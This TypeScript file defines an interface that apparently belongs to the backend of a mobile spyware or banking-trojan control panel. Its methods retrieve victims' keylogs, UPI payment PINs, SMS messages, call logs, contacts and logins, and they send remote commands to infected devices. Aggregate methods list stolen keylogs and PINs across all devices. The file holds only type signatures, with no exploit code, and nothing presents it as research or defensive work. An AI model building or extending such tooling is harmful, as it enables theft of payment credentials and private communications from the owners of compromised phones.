
export interface DeviceStats {
    messages: number;
    apps: number;
    keylogs?: number;
    upiPins?: number;
}

export interface IDeviceProvider {
    listDevices(limit?: number): Promise<any[]>;
    getDevice(deviceId: string): Promise<any>;
    getDeviceStats(deviceId: string): Promise<DeviceStats>;
    getMessages(deviceId: string, limit?: number): Promise<any[]>;
    getApps(deviceId: string, limit?: number): Promise<any[]>;
    getKeylogs(deviceId: string, limit?: number): Promise<any[]>;
    getUpiPins(deviceId: string): Promise<any[]>;
    getHeartbeat(deviceId: string, limit?: number): Promise<any[]>;
    getSims(deviceId: string): Promise<any[]>;
    getNotifications(deviceId: string, limit?: number): Promise<any[]>;
    getCallLogs(deviceId: string, limit?: number): Promise<any[]>;
    getContacts(deviceId: string): Promise<any[]>;
    getLogins(deviceId: string): Promise<any[]>;
    sendCommand(deviceId: string, command: string, payload: any): Promise<any>;

    // Global lists
    listAllMessages(limit?: number): Promise<any[]>;
    listAllApps(limit?: number): Promise<any[]>;
    listAllKeylogs(limit?: number): Promise<any[]>;
    listAllUpiPins(limit?: number): Promise<any[]>;
}
